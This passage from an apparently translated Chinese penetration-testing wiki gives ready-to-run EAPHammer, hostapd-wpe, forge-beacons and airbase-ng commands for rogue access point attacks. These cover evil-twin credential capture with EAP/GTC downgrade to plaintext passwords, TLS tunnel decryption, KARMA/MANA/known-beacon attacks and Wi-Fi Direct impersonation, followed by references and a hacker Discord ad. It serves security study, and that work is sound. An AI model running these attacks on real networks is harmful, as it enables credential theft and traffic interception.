# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
默认情况下，EAPHammer使用以下身份验证方法（请注意，首先尝试获取明文密码的是GTC，然后使用更强大的身份验证方法）：
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
这是避免长连接时间的默认方法。但是，您也可以指定服务器的认证方法从最弱到最强：
```
--negotiate weakest
```
或者你也可以使用：

* 使用 `--negotiate gtc-downgrade` 来使用高效的 GTC 降级实现（明文密码）
* 使用 `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` 来手动指定提供的方法（以与组织相同的顺序提供相同的认证方法，攻击将更难被检测）。
* [在维基中查找更多信息](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**使用 Airgeddon**

`Airgeddon` 可以使用先前生成的证书来提供 EAP 认证给 WPA/WPA2-Enterprise 网络。虚假网络将降级连接协议到 EAP-MD5，以便**捕获用户和密码的 MD5 值**。之后，攻击者可以尝试破解密码。\
`Airggedon` 为您提供了**连续的恶意双胞胎攻击（嘈杂）**或**仅在有人连接时创建恶意攻击（平稳）**的可能性。

![](<../../.gitbook/assets/image (129).png>)

### 在恶意双胞胎攻击中调试 PEAP 和 EAP-TTLS TLS 隧道

_此方法在 PEAP 连接中进行了测试，但由于我正在解密一个任意的 TLS 隧道，因此这也适用于 EAP-TTLS_

在 _hostapd-wpe_ 的**配置**中**注释掉**包含 _**dh\_file**_ 的行（从 `dh_file=/etc/hostapd-wpe/certs/dh` 到 `#dh_file=/etc/hostapd-wpe/certs/dh`）\
这将使 `hostapd-wpe` 使用 RSA 交换密钥，而不是 DH，因此您将能够稍后**知道服务器的私钥**来**解密**流量。

现在像往常一样使用修改后的配置启动**恶意双胞胎**使用**`hostapd-wpe`**。同时，在执行恶意双胞胎攻击的**接口**上启动**`wireshark`**。

现在或稍后（当您已经捕获了一些认证意图时），您可以在 `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...` 中向 wireshark 添加私有 RSA 密钥。

添加一个新条目并填写以下值：**IP 地址 = 任意** -- **端口 = 0** -- **协议 = 数据** -- **密钥文件**（**选择您的密钥文件**，为避免问题，请选择一个**没有密码保护的密钥文件**）。

![](<../../.gitbook/assets/image (151).png>)

然后查看新的**"解密的 TLS" 选项卡**：

![](<../../.gitbook/assets/image (152).png>)

## KARMA、MANA、Loud MANA 和已知信标攻击

### ESSID 和 MAC 黑/白名单

以下表格列出了可用的不同类型的 MFACLs（管理帧访问控制列表），以及在使用时的效果：

![](<../../.gitbook/assets/image (149).png>)
```
# example EAPHammer MFACL file, wildcards can be used
78:f0:97:fc:b5:36
9a:35:e1:01:4f:cf
69:19:14:60:20:45
ce:52:b8:*:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```
# example ESSID-based MFACL file
apples
oranges
grapes
pears

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Karma攻击是第二种利用站点使用的网络选择过程的恶意接入点攻击形式。在2005年的一篇白皮书中，Dino Dai Zovi和Shane Macaulay描述了攻击者如何配置一个接入点来监听定向探测请求，并用匹配的定向探测响应对所有请求进行响应。这会导致受影响的站点自动向攻击者的接入点发送关联请求。接入点然后回复一个关联响应，导致受影响的站点连接到攻击者。

### MANA

根据Ian de Villiers和Dominic White的说法，现代站点被设计为通过忽略那些尚未对至少一个广播探测请求做出响应的接入点的定向探测响应来保护自己免受Karma攻击。直到2015年，White和de Villiers开发了一种绕过这种保护措施的方法。在White和de Villiers改进的Karma攻击（MANA攻击）中，定向探测响应被用来重建附近站点的PNL。当从一个站点接收到广播探测请求时，攻击者的接入点会用该设备的PNL中已经看到的一个任意SSID来响应。

简而言之，MANA算法的工作原理如下：每次接入点接收到一个探测请求时，首先确定它是广播还是定向探测。如果是定向探测，发送者的MAC地址将被添加到哈希表中（如果尚未存在），并且ESSID将被添加到该设备的PNL中。接入点然后用定向探测响应进行回复。如果是广播探测，接入点将为该设备的PNL中的每个网络响应探测响应。

使用eaphammer的MANA攻击：
```
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### 喧闹的MANA

请注意，标准的MANA攻击仍然无法攻击那些根本不使用定向探测的设备。因此，如果我们之前也不知道设备PNL中的任何条目，我们需要找出其他攻击方式。

一种可能性是所谓的喧闹的MANA攻击。这种攻击依赖于这样一个想法，即彼此在物理上接近的客户端设备可能至少在它们的PNL中有一些共同的条目。

简而言之，喧闹的MANA攻击不是针对特定设备的PNL中的每个ESSID响应探测请求，而是对它以前见过的所有设备的所有PNL中的每个ESSID发送探测响应。将这与集合论联系起来，我们可以说AP为附近设备的所有PNL的并集中的每个ESSID发送探测响应。
```
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### 已知的信标攻击

仍然存在 Loud MANA 攻击无法成功的情况。\
已知的信标攻击是一种“暴力破解”ESSIDs的方法，试图让受害者连接到攻击者。攻击者创建一个响应任何ESSID的AP，并运行一些代码发送伪造ESSIDs的信标，这些ESSID名称在一个单词列表中。希望受害者的 PNL 中包含一些这些 ESSID 名称，并尝试连接到伪造的 AP。\
Eaphammer 实现了这种攻击作为 MANA 攻击，其中所有列表中的 ESSIDs 都会被加载（您还可以将其与 `--loud` 结合使用，创建一个 Loud MANA + Known beacons 攻击）:
```
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**已知的信标爆破攻击**

已知信标很吵闹。您可以使用 Eaphammer 项目中的脚本，快速地发射文件中每个 ESSID 名称的信标。如果将此脚本与 Eaphammer MANA 攻击结合使用，客户端将能够连接到您的 AP。
```
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

Wi-Fi Direct是一种Wi-Fi标准，允许设备在没有无线AP的情况下相互连接，其中两个设备之一将充当AP（称为组所有者）。您可以在许多物联网设备中找到Wi-Fi Direct，如打印机、电视等。

Wi-Fi Direct依赖于Wi-Fi Protected Setup（**WPS**）来安全连接设备。WPS具有多种配置方法，如**Push-Button** Configuration（PBC）、**PIN entry**和**Near-Field** Communication（NFC）。

因此，如果使用PIN，先前针对WPS PIN的攻击也适用于这里。

### EvilDirect劫持

这类似于Evil-Twin，但适用于Wi-Fi Direct，您可以冒充组所有者，试图使其他设备如手机连接到您：`airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0`

## 参考资料

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)

TODO: 查看[https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)（使用Facebook登录和在强制传送门中模拟WPA）

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)服务器，与经验丰富的黑客和赏金猎人交流！

**黑客见解**\
参与深入探讨黑客行为的刺激和挑战的内容

**实时黑客新闻**\
通过实时新闻和见解了解快节奏的黑客世界

**最新公告**\
通过最新的赏金计划发布和重要平台更新保持信息更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，立即与顶尖黑客合作！
